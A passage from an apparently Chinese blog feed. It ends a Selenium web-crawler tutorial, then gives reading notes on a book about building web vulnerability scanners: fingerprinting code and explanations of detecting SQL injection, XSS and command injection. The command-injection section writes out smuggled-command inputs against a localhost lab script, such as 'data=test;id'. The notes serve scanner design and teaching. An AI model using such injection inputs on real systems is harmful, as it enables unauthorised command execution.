组件无人维护并且会出现各种各样的问题，所以作者也已经不再维护)的组合，但发现Chrome以及FireFox也相继推出无头 ( headless ) 浏览器模式，个人比较倾向Chrome。本文采用的是Selenium+Chrome的组合。</p><h4 id="2-示例：-1"><a href="#2-示例：-1" class="headerlink" title="2.示例："></a><strong>2.示例：</strong></h4><p><strong>运用到爬虫中的思路是：</strong></p><p>使用Selenium 渲染网页，解析渲染后的网页源码，或者直接通过Selenium 接口获取页面中的元素。<br>还是以 <a href="http://book.sina.com.cn/excerpt/">新浪读书——书摘</a> 这个网站为例，目标是获取列表中每篇文章详情页的地址</p><p><strong>示例代码：</strong></p><pre><code class="hljs"># coding=utf-8import timefrom selenium import webdriverclass SinaBookSpider(object):    # 创建可见的Chrome浏览器， 方便调试    driver = webdriver.Chrome()    # 创建Chrome的无头浏览器    # opt = webdriver.ChromeOptions()    # opt.set_headless()    # driver = webdriver.Chrome(options=opt)    driver.implicitly_wait(10)    total = 1526  # 预先计算的总数据量    count = 0  # 已爬取的数据量    # 记录解析以及翻页位置    location = 0    click_times = 0    def run(self):        &quot;&quot;&quot;        开始爬虫        :return:        &quot;&quot;&quot;        # get方式打开网页        self.driver.get(&quot;http://book.sina.com.cn/excerpt/rwws/&quot;)        self.parselist()        while self.count &lt; self.total:            if self.click_times is 2:                self.driver.find_element_by_css_selector(&#39;#subShowContent1_page &gt; span:nth-child(6) &gt; a&#39;).click()                # 等待页面加载完成                time.sleep(5)                self.click_times = 0                self.location = 0            else:                self.driver.find_element_by_css_selector(&#39;#subShowContent1_loadMore&#39;).click()                # 等待页面加载完成                time.sleep(3)                self.click_times += 1            # 分析加载的新内容，从location开始            self.parselist()        self.driver.quit()    def parselist(self):        &quot;&quot;&quot;        解析列表        :return:        &quot;&quot;&quot;        divs = self.driver.find_elements_by_class_name(&quot;item&quot;)        for i in range(self.location, len(divs)):            link = divs[i].find_element_by_tag_name(&#39;a&#39;).get_attribute(&quot;href&quot;)            print link            self.location += 1            self.count += 1        print self.countif __name__ == &#39;__main__&#39;:    spider = SinaBookSpider()    spider.run()</code></pre><blockquote><p>代码地址：<a href="https://github.com/linbo-lin/dynamic-web-process">https://github.com/linbo-lin/dynamic-web-process</a><br>如果你想实际运行上述代码，请在运行之前确定：安装了与浏览器版本对应的驱动，并正确的添加到了环境变量中。</p></blockquote><h4 id="3-使用selenium时同样要特别注意的是如何确定-网页是否加载完成"><a href="#3-使用selenium时同样要特别注意的是如何确定-网页是否加载完成" class="headerlink" title="3.使用selenium时同样要特别注意的是如何确定 网页是否加载完成"></a><strong>3.使用selenium时同样要特别注意的是如何确定 网页是否加载完成</strong></h4><p><strong>有三种方式：</strong></p><p>(1)强制等待<br>(2)隐形等待<br>(3)显性等待</p><p>有关这三种方式的讲解可以看这里：<a href="https://huilansame.github.io/huilansame.github.io/archivers/sleep-implicitlywait-wait">Python selenium —— 一定要会用selenium的等待，三种等待方式解读 —— 灰蓝的博客</a></p><h3 id="4-总结："><a href="#4-总结：" class="headerlink" title="(4)总结："></a><strong>(4)总结：</strong></h3><p><strong>到此，我们介绍了动态页面处理的一些思路：</strong></p><p><strong>1.逆向回溯 :</strong> 该方法属于手工方法，不适合自动检测<br><strong>2.渲染动态页面 :</strong> 使用PySide或ghost.py，但是由于太过久远已经被时代淘汰了，所以这种方法并不优雅<br><strong>3.selenium 模拟浏览器:</strong> 这种方法是现代大型爬虫最常使用的模式</p><h2 id="0X03-参考链接"><a href="#0X03-参考链接" class="headerlink" title="0X03 参考链接"></a><strong>0X03 参考链接</strong></h2><p><a href="https://blog.csdn.net/ha_hha/article/details/80324343">https://blog.csdn.net/ha_hha/article/details/80324343</a><br><a href="https://blog.csdn.net/ha_hha/article/details/80324582">https://blog.csdn.net/ha_hha/article/details/80324582</a><br><a href="https://blog.csdn.net/Ha_hha/article/details/80324707">https://blog.csdn.net/Ha_hha/article/details/80324707</a><br><a href="https://github.com/linbo-lin/dynamic-web-process">https://github.com/linbo-lin/dynamic-web-process</a><br><a href="https://docs.seleniumhq.org/">https://docs.seleniumhq.org/</a><br><a href="https://ghost-py.readthedocs.io/en/latest/#">https://ghost-py.readthedocs.io/en/latest/#</a><br><a href="http://pyside.github.io/docs/pyside/">http://pyside.github.io/docs/pyside/</a><br><a href="https://huilansame.github.io/huilansame.github.io/">https://huilansame.github.io/huilansame.github.io/</a><br><a href="https://blog.csdn.net/xiaozhuxmen/article/details/52014901">https://blog.csdn.net/xiaozhuxmen/article/details/52014901</a><br><a href="http://www.cnblogs.com/lhb25/p/how-browsers-work.html#Resources">http://www.cnblogs.com/lhb25/p/how-browsers-work.html#Resources</a><br><a href="http://book.sina.com.cn/excerpt/">http://book.sina.com.cn/excerpt/</a><br><a href="https://blog.csdn.net/u010378313/article/details/51435992">https://blog.csdn.net/u010378313/article/details/51435992</a></p>]]></content>
    
    
    <categories>
      
      <category>备忘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>爬虫</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>《白帽子讲 web 扫描》 阅读记录(下)</title>
    <link href="/2019/03/04/%E3%80%8A%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2%20web%20%E6%89%AB%E6%8F%8F%E3%80%8B%20%E9%98%85%E8%AF%BB%E8%AE%B0%E5%BD%95(%E4%B8%8B)/"/>
    <url>/2019/03/04/%E3%80%8A%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2%20web%20%E6%89%AB%E6%8F%8F%E3%80%8B%20%E9%98%85%E8%AF%BB%E8%AE%B0%E5%BD%95(%E4%B8%8B)/</url>
    
    <content type="html"><![CDATA[<h2 id="0X04-应用指纹识别"><a href="#0X04-应用指纹识别" class="headerlink" title="0X04 应用指纹识别"></a><strong>0X04 应用指纹识别</strong></h2><h3 id="1-概念"><a href="#1-概念" class="headerlink" title="1.概念"></a><strong>1.概念</strong></h3><p>应用指纹，其实<strong>是Web 应用的一种身份标识</strong>，具有唯一性。在Web 应用的开发过程中，为了提高开发的效率和系统的稳定性，通常会用到一些成熟、稳定的第三方环境、程序、框架或服务等，而<strong>这些第三方内容的名称或标识就是这里所说的应用指纹。</strong></p><h3 id="2-应用指纹种类及识别"><a href="#2-应用指纹种类及识别" class="headerlink" title="2.应用指纹种类及识别"></a><strong>2.应用指纹种类及识别</strong></h3><p>对于一个简单的Web 应用而言，它所涉及的应用指纹信息非常多，这里为了便于理解和记忆，我们根据网络数据的流向，并结合分层思想，<strong>将常见的应用指纹分成了5 类</strong>， 如下：</p><span id="more"></span><p><strong>(1)网络层指纹</strong><br>网关、防火墙、VPN、CDN、DNS、路由器等基础设施指纹。</p><p><strong>(2)主机层指纹</strong><br>操作系统信息、软件防火墙、主机上各种对外提供服务的软件指纹。</p><p><strong>(3)服务层指纹</strong><br>Web 服务、FTP 服务、SSH 服务等各种对外提供服务的指纹。</p><p><strong>(4)应用层指纹</strong><br>各种建站程序、开源框架、前端框架等。</p><p><strong>(5)语言层指纹</strong><br>各种脚本语言信息， 如： ASP、ASPX、PHP 和JSP 等</p><p>应用指纹识别是通过对目标进行分析和判断，知道它是由哪些应用指纹组成的。举个例子，如果对安全宝的官网<a href="http://www.anquanbao.com进行应用指纹识别,/">www.anquanbao.com进行应用指纹识别，</a> 那么就能获取如下基础信息：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F67.png" alt="此处输入图片的描述"></p><h3 id="3-应用指纹识别技术"><a href="#3-应用指纹识别技术" class="headerlink" title="3.应用指纹识别技术"></a><strong>3.应用指纹识别技术</strong></h3><h4 id="1-获取特征的方式"><a href="#1-获取特征的方式" class="headerlink" title="(1)获取特征的方式"></a><strong>(1)获取特征的方式</strong></h4><p>既然应用指纹的价值如此之大，那么如何去识别和获取呢？首先需要获取指纹的特征，<strong>通常这些指纹特征会存在于特定页面的HTTP响应中，因此可以通过下面三种方式来处理：</strong></p><p><strong>(1)内容特征</strong><br>这类指纹的特征在HTTP 响应的正文中， 通过<strong>对响应正文中的内容进行特征匹配即可识别</strong>。</p><p><strong>(2)页面特征</strong><br>这类指纹在HTTP请求中并没有明显的特征，而页面的内容却相对固定，因此可以<strong>根据页面内容的Hash值进行识别。</strong></p><p><strong>(3)Headers 特征</strong><br>这类指纹会在HTTP响应的消息报头中增加自己的报头信息，因此可以<strong>直接在消息报头中进行识别</strong>。</p><h4 id="2-指纹特征库"><a href="#2-指纹特征库" class="headerlink" title="(2)指纹特征库"></a><strong>(2)指纹特征库</strong></h4><p>按照文件的形式存储</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F68.png" alt="此处输入图片的描述"></p><h4 id="3-功能实现"><a href="#3-功能实现" class="headerlink" title="(3)功能实现"></a><strong>(3)功能实现</strong></h4><p>应用指纹识别主要有三种常见的方式， 因此， 在代码实现中， 需要对这三部分内容进行关键特征匹配识别， 部分核心代码如下：</p><pre><code class="hljs">class FingerScan:&#39;&#39;&#39;&#39;&#39;&#39;def __init__(self):&#39;&#39;&#39;&#39;&#39;&#39;self._app_file = Settings.FINGER_FILE#指纹扫描模式:0为根域名扫描；1为自定义路径扫描模式self._scan_mode=0self._app_db = open(self._app_file,&quot;rb&quot;).readlines()self._server_finger = Noneself._http_code= Nonedef md5(self,content):&#39;&#39;&#39;&#39;&#39;&#39;if isinstance(content,unicode):content = content.encode(&quot;utf-8&quot;)else:content = contentm = hashlib.md5()try:m.update(content)return m.hexdigest()except:return Nonedef set_mode(self,mode):&#39;&#39;&#39;&#39;&#39;&#39;self._scan_mode = mode#&#123;&quot;wordpress&quot;:&#123;&quot;url&quot;:&quot;/wp-admin.php&quot;,&quot;header&quot;:(&quot;server&quot;:&quot;WAF/2.0&quot;),&quot;md5&quot;:&quot;aaaaaaaaaaa&quot;&#125;&#125;def scan_finger(self,site):&#39;&#39;&#39;&#39;&#39;&#39;app_name_list = []for item in self._app_db:# 注释掉则忽略if item.startswith(&quot;#&quot;):continuedict_item =json.loads(item.strip())# 将 app 的键链接起来app_name = &quot;&quot;.join(dict_item.keys()).strip()# 根据上面得到的键，获取值app_info = dict_item.get(app_name)# 因为值也是一个字典，因此要获取这个字典的 url 键对应的值url = app_info.get(&quot;url&quot;)# 获取 URL 类对象urlobj = URL(site)# 自定义路径扫描if self._scan_mode==1:test_url = urlobj.get_uri_string()if test_url.endswith(&quot;/&quot;):target_url = test_url[0:-1] + urlelse:target_url = test_url + url# 根路径扫描else:test_url   = urlobj.get_netloc()target_url = urlobj.get_scheme()+&quot;://&quot;+test_url+ urllog.info(target_url)try:# 发起请求res = wcurl.get(target_url)except:continue# 得到结果dst_headers  = res.headersdst_body= res.bodyself._http_code = res.get_code()try:self._server_finger = dst_headers[&quot;server&quot;]except:passif dst_body is None:continue# 计算 md5md5_body = self.md5(dst_body)key_list = app_info.keys()if &quot;headers&quot; in key_list:app_headers = app_info.get(&quot;headers&quot;)app_key = app_headers[0].lower()app_value = app_headers[1]if app_key in dst_headers.keys():dst_info = dst_headers.get(app_key)result = re.search(app_value,dst_info,re.I)if result:if &quot;body&quot; in key_list:app_body = app_info.get(&quot;body&quot;)# 进行比较                                result = re.search(app_body,dst_body,re.I)                                if result:                                        app_name_list.append((target_url,app_name))else:app_name_list.append((target_url,app_name))elif &quot;body&quot; in key_list:app_body = app_info.get(&quot;body&quot;)# 进行比较result = re.search(app_body,dst_body,re.I)if result:app_name_list.append((target_url,app_name))elif &quot;md5&quot; in key_list:app_md5 = app_info.get(&quot;md5&quot;)# 进行比较if app_md5 == md5_body:app_name_list.append((target_url,app_name))return app_name_listdef get_server(self):&#39;&#39;&#39;&#39;&#39;&#39;return self._server_fingerdef get_code(self):&#39;&#39;&#39;&#39;&#39;&#39;return self._http_codeif __name__==&quot;__main__&quot;:&#39;&#39;&#39;&#39;&#39;&#39;if len(sys.argv)&lt;2:print &quot;Plz Input Site&quot;sys.exit()fs = FingerScan()print sys.argv[1]test=fs.scan_finger(sys.argv[1])print testfor item in test:print itemprint fs.get_server()</code></pre><h2 id="0X05-安全漏洞审计"><a href="#0X05-安全漏洞审计" class="headerlink" title="0X05 安全漏洞审计"></a><strong>0X05 安全漏洞审计</strong></h2><h3 id="1-漏洞审计三部曲"><a href="#1-漏洞审计三部曲" class="headerlink" title="1.漏洞审计三部曲"></a><strong>1.漏洞审计三部曲</strong></h3><p>对于任何一种漏洞的检测或审计，都会遵循下面的流程：</p><p>(1) 需要分析现实中这个漏洞的各种场景。<br>(2) 构造出可以<strong>覆盖所有漏洞场景的扫描载荷</strong>(payload) 。<br>(3) 将其<strong>转化成扫描器的检测脚本</strong>并生成最终的扫描签名。</p><h3 id="2-安全漏洞可以分成两类："><a href="#2-安全漏洞可以分成两类：" class="headerlink" title="2.安全漏洞可以分成两类："></a><strong>2.安全漏洞可以分成两类：</strong></h3><h4 id="1-通用型漏洞："><a href="#1-通用型漏洞：" class="headerlink" title="(1)通用型漏洞："></a><strong>(1)通用型漏洞：</strong></h4><p>具有普遍们大部分应用都会涉及如 SQL 注入漏洞、 XSS 跨站湍洞、命令执行注入或文件包含漏洞等。它们主要是<strong>针对HTTP请求中的输入部分进行测试</strong>的，通过<strong>改变这些输入值就 可以对漏洞进行测试和判定</strong>。</p><h4 id="2-Nday-0day-漏洞："><a href="#2-Nday-0day-漏洞：" class="headerlink" title="(2)Nday&#x2F;0day 漏洞："></a><strong>(2)Nday&#x2F;0day 漏洞：</strong></h4><p>具有针对型，通常是指某一类具体应用， 比如：建站应用Discuz 的SQL 注入漏洞、IIS 的远程溢出漏洞或OpenSSL 的心脏出血漏洞等。</p><h3 id="3-通用型漏洞审计"><a href="#3-通用型漏洞审计" class="headerlink" title="3.通用型漏洞审计"></a><strong>3.通用型漏洞审计</strong></h3><h4 id="1-SOL注入漏洞"><a href="#1-SOL注入漏洞" class="headerlink" title="(1)SOL注入漏洞"></a><strong>(1)SOL注入漏洞</strong></h4><p>原理我这里就省略了…</p><h5 id="1-页面比较法"><a href="#1-页面比较法" class="headerlink" title="1.页面比较法"></a><strong>1.页面比较法</strong></h5><p>这种方法比较直观，也易于理解，而且<strong>准确度较高</strong>。 我们可以利用SQL语句来构造 恒真和恒假两种不同状态，如果目标存在 SQL 注入漏洞，那么恒真状态对页面内容的影响并不会产生较大的改变；而恒假状态则会明显地改变页面的内容，通过<strong>页面相似度算法</strong>比较这两个页面的相似程度，就可以判定目标是否存在SQL注入漏洞。</p><blockquote><p><strong>注：</strong> 说到这个页面相似度算法，我就想起了 sqlmap 的一个非常重要的东西： ratio ，这个是 sqlmap 中的重要组件之一，也是一种计算页面相似度的算法，在整个 sqlmap 中占有非常核心的地位</p></blockquote><h5 id="2-时间比较法"><a href="#2-时间比较法" class="headerlink" title="2.时间比较法"></a><strong>2.时间比较法</strong></h5><p>时间比较法主要是<strong>利用时间延迟技术</strong>进行漏洞的判定，虽然Web服务器可以隐藏错误或数 据，但是必定会返回HTTP响应信息， 因此可以向数据库中注入 时间延迟函数。 如果目标存在SQL注入漏洞，那么时间延迟函数就会被执行，服务端的响应时间就会延长，通过与正常服务端的响应时间比较， 可以判定目标是否存在漏洞。</p><h5 id="3-扫描载荷"><a href="#3-扫描载荷" class="headerlink" title="3.扫描载荷"></a><strong>3.扫描载荷</strong></h5><p>现在我们可以对 SQL 注入漏洞的场景进行整理，并给出最终的扫描载荷，扫描器利用它们可以对目标进行SQL注入检测， 如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F69.png" alt="此处输入图片的描述"><br><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F70.png" alt="此处输入图片的描述"></p><h5 id="4-代码实现"><a href="#4-代码实现" class="headerlink" title="4.代码实现"></a><strong>4.代码实现</strong></h5><p>下面我贴出作者写的部分关键代码(GET 方法),并在必要的地方给出了注释方便理解</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F71.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F72.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F73.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F74.png" alt="此处输入图片的描述"></p><h4 id="2-XSS-漏洞"><a href="#2-XSS-漏洞" class="headerlink" title="(2)XSS 漏洞"></a><strong>(2)XSS 漏洞</strong></h4><h5 id="1-概念与区别"><a href="#1-概念与区别" class="headerlink" title="1.概念与区别"></a><strong>1.概念与区别</strong></h5><p>这里简单说一下 反射和 DOM XSS 的区别吧</p><p><strong>反射型 XSS</strong> </p><p>反射性XSS, 其最明显的特征就是恶意数据通常会在链接里，需要受害者的参与，攻击者会将篡改后的链接发送给用户，用户访问这个链接后，恶意脚本会被浏览器执行。</p><p><strong>DOM XSS</strong> </p><p>DOM型XSS, 是基于文档对象模型的一种XSS漏洞，客户端的脚本程序可以通过DOM动态地操作和修改页面内容。<strong>它不依赖于提交数据到服务端(这或许是两者的最大差别了，其实就是会不会与服务器进行交互)</strong>，但如果从客户端获取DOM中的数据没有进行过滤，那么攻击者就可以注入恶意代码，并在浏览器端执行，产生DOM型XSS。</p><h5 id="2-利用场景"><a href="#2-利用场景" class="headerlink" title="2.利用场景"></a><strong>2.利用场景</strong></h5><p>反射型就不说了，然后存储型提一点就是<strong>输入点和输出点一般不在一个页面</strong>，这里说一下 DOM 型吧。</p><p>利用document对象的相关属性来获取前端的输入内容，然后传到eval函数中执行。</p><p><strong>页面代码：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F75.png" alt="此处输入图片的描述"></p><p><strong>前端输入</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F76.png" alt="此处输入图片的描述"></p><p><strong>执行结果</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F77.png" alt="此处输入图片的描述"></p><p><strong>DOM型XSS漏洞常见的输入输出点如下表：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F78.png" alt="此处输入图片的描述"></p><blockquote><p><strong>注意：</strong></p><p>现在主流浏览器都已经增加了对XSS攻击的防护，也就是我们常说的XSSFilter(XSS过滤器），<strong>如Chrome通过内置过滤器XSS-Auditor进行过滤，Firefox通过NoScript扩展支持该功能等</strong>。所以对于一些常用的payload,浏览器都会有相应的干扰策略，它们会阻碍正常的检测与识别。<strong>因此在真实的扫描中，通常需要绕过后才能进行有效的检测。</strong></p></blockquote><h5 id="2-检测原理"><a href="#2-检测原理" class="headerlink" title="2.检测原理"></a><strong>2.检测原理</strong></h5><h6 id="1-反射型XSS"><a href="#1-反射型XSS" class="headerlink" title="(1)反射型XSS"></a><strong>(1)反射型XSS</strong></h6><p>从上面的漏洞场景来看， 反射型XSS漏洞具有明显的输入／输出特点，<strong>而且数据提交的页面和数据输出的页面是同一个</strong>， 因此可以通过构造扫描载荷(payload)进行提交，然后<strong>检查输出的内容</strong>就可以判定目标是否存在反射型XSS漏洞。</p><h6 id="2-存储型XSS"><a href="#2-存储型XSS" class="headerlink" title="(2)存储型XSS"></a><strong>(2)存储型XSS</strong></h6><p>存储型 XSS 与反射型 XSS 的场景基本相同，<strong>只不过存储型会向服务端插入数据</strong>，<strong>如果用户数据提交的页面与输入内容的展示页面相同，那么可以通过对输出内容进行检测来判定</strong>；如果用户数据提交的页面与输入内容的展示<strong>页面不同，这种情况就需要先找到输入内容的展示页面， 并在该页面中进行检测和判定</strong>。</p><h6 id="3-DOM型XSS"><a href="#3-DOM型XSS" class="headerlink" title="(3)DOM型XSS"></a><strong>(3)DOM型XSS</strong></h6><p>与前面两种XSS 漏洞类型不同，DOM 型XSS 是在浏览器的解析中，改变当前页面的DOM树，对于这种交互操作较多的单页面，<strong>可以借助浏览器引擎进行检测</strong>，但如果每一个页面都增加这些交互操作，那么就会严重影响扫描器效率，所以这里暂不实现该类型(<strong>说你个锤子….等我找别的扫描器分析吧…坑</strong>)。</p><p>下面对漏洞场景中的漏洞检测方法进行整理和覆盖，并给出最终的扫描载荷列表。在实际的测试过程中，我们发现<code>&lt;script&gt;</code>标签经常会被一些防护设备作为特征过滤，从而产生干扰，因此在实践中我们用<code>&lt;a&gt;</code>标签作为特征进行检测。</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F79.png" alt="此处输入图片的描述"></p><p>最终的扫描载荷可以定义为下列形式：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F80.png" alt="此处输入图片的描述"></p><p>具体的内容如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F81.png" alt="此处输入图片的描述"></p><p>因此， 通过这个扫描载荷就可以覆盖上面描述的所有场景。</p><p>下面是具体的代码实现。由千其他类型的XSS 并不容易在扫描器中进行通用的检测，所以这里主要选择反射型XSS 来实现。根据上述的检测原理， 并结合最终的扫描载荷， </p><p><strong>具体的代码实现如下：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F82.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F83.png" alt="此处输入图片的描述"></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F84.png" alt="此处输入图片的描述"></p><blockquote><p><strong>我这里需要稍微解释一下：</strong></p><p>(1)首先我们需应该自定义很多很多带标签的用来 fuzz 的字符串(这里作者由于是 demo<br>于是只定义了一个，实际中是远远不够的)，而且标签可以是<code>&lt;img&gt;</code> <code>&lt;svg&gt;</code> 之类的，不一定是 <code>&lt;a&gt;</code></p><p>(2)那么为什么这个标签最后能在页面中完整返回就说明漏洞可能存在呢？因为完整返回说明了我们能够在页面源码中注入我们的标签，这样我们就有利用的可能</p></blockquote><h4 id="3-命令执行漏洞"><a href="#3-命令执行漏洞" class="headerlink" title="(3)命令执行漏洞"></a><strong>(3)命令执行漏洞</strong></h4><h5 id="1-概念与原理"><a href="#1-概念与原理" class="headerlink" title="1.概念与原理"></a><strong>1.概念与原理</strong></h5><p>通常情况下，如果Web应用程序需要执行系统命令，那么开发人员会将客户端获取的数据直接传递给具有执行系统命令功能的函数中， 如： system、exec、shell_exec等。如果没有对客户端的数据进行过滤就产生命令执行注入漏洞，那么攻击者可以通过命令注入来执行额外的命令，从而达到攻击的效果。</p><h5 id="2-利用场景-1"><a href="#2-利用场景-1" class="headerlink" title="2.利用场景"></a><strong>2.利用场景</strong></h5><h6 id="场景一"><a href="#场景一" class="headerlink" title="场景一"></a><strong>场景一</strong></h6><p>将前端获取的变量<strong>直接与命令语句进行拼接，然后代入命令执行函数中</strong>，这里以Linux操作系统为例说明。</p><p><strong>后端代码：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F85.png" alt="此处输入图片的描述"></p><p>从上面的代码中可以看到， 由千变量位千语句的最后面， 因此可以利用 Linux 中的 些特殊符号完成命令的注入。在构造扫描载荷 (payload) 之前， 先来看看这些特殊符号的作用， 如下：</p><p><strong>1.管道符号(|)</strong><br>可以连接多个命令，它会把第一个命令command1 执行的结果作为第二个命令command2 的输入传给command2 并执行。</p><p><strong>2.连接符号(;)</strong><br>可以连接多个命令， 它会依次顺序地执行这些命令。</p><p><strong>3.逻辑与符号(&amp;&amp;)</strong><br>可以连接多个命令， 只有第一个命令执行成功， 才会执行第二个命令。</p><p><strong>4.逻辑或符号 (||)</strong><br>可以连接多个命令， 只有第一个命令执行失败， 才会执行第二个命令；否则不会执行第二个命令。</p><p>上面所介绍的符号都可以用来连接多个命令，根据每个符号的特点， 可构造对应的扫描载荷(payload)。</p><p><strong>前端输入:</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F86.png" alt="此处输入图片的描述"></p><p>访问链接 <a href="http://localhost/book/cmd/1_cmd.php?data=test;id">http://localhost/book/cmd/1_cmd.php?data=test;id</a>;</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F87.png" alt="此处输入图片的描述"></p><p>从上面的效果截图中可以看到，程序除了成功执行ls命令外，还执行了额外的id命令，从而成功完成命令执行注入攻击。</p><h6 id="场景二"><a href="#场景二" class="headerlink" title="场景二"></a><strong>场景二</strong></h6><p>将前端获取的变量通过单引号或双引号，代入命令执行函数中 </p><p><strong>后端代码：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F88.png" alt="此处输入图片的描述"></p><p>由于<strong>可控变量在单引号之间</strong>，所以<strong>需要先对单引号进行闭合</strong>，然后再利用分号的特性进行后续的命令注入， 因此可以构造如下的payload进行检测</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F89.png" alt="此处输入图片的描述"></p><p>访问链接 <a href="http://localhost/book/cmd/2_cmd.php?data=test%27;id">http://localhost/book/cmd/2_cmd.php?data=test&#39;;id</a>;’</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F90.png" alt="此处输入图片的描述"></p><h6 id="场景三"><a href="#场景三" class="headerlink" title="场景三"></a><strong>场景三</strong></h6><p>将用户的输入赋值给某个变量</p><p><strong>后端代码：</strong></p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F91.png" alt="此处输入图片的描述"></p><p>在对场景3进行分析之前， 我们需要先来了解一下PHP的一些特性。在PHP中， <strong>字符串的定义可以使用单引号， 也可以使用双引号。</strong> </p><blockquote><p><strong>它们的区别是：</strong><br>双引号串中的变扯将被解析而且替换，而单引号串中的内容总被认为是普通字符，不具备任何解析功能。</p></blockquote><p>下面分别对<strong>可变变量</strong>、 <strong>可变函数</strong>和<strong>print函数</strong>进行讲解</p><p><strong>1.可变变量：</strong></p><p>PHP中提供了一种其他类型的变量， 称之为可变变量。就是说， <strong>一个变量的变量名可以动态设置和使用</strong>。例如一个普通的变量通过声明来设置， 如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F92.png" alt="此处输入图片的描述"></p><p>一个可变变量获取了一个普通变量的值作为这个可变变量的变量名。在上面的例子中，hello 使用了两个美元符号（＄）以后， 就可以作为一个可变变量的变最了， 如下：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F93.png" alt="此处输入图片的描述"></p><p>这时， 我们会发现这里定义了两个变量：变量<code>$a</code> 的内容是”hello” , 并且变量<code>$hello</code> 的内容是”world”。也可以用下面的语句来定义， 它们的效果是一致的， 如：</p><p><img src="https://picture-1253331270.cos.ap-beijing.myqcloud.com/%E7%99%BD%E5%B8%BD%E5%AD%90%E8%AE%B2web%E6%89%AB%E6%8F%8F94.png" alt="此处输入图片的描述"></p><p>这里使用<code>&quot;$&#123;$a&#125;&quot;</code> 来替换<code>&quot;$$a&quot;</code> 主要利用大括号在变量间接引用中进行定界， 避免歧义。</p><p><strong>2.可变函数</strong></p><p>PHP同时也支持可变函数。这意味着如果一个变量名后有圆括号，PHP将寻找与变量的值同名的函数，并且尝试执行它。例如：</p><p><img 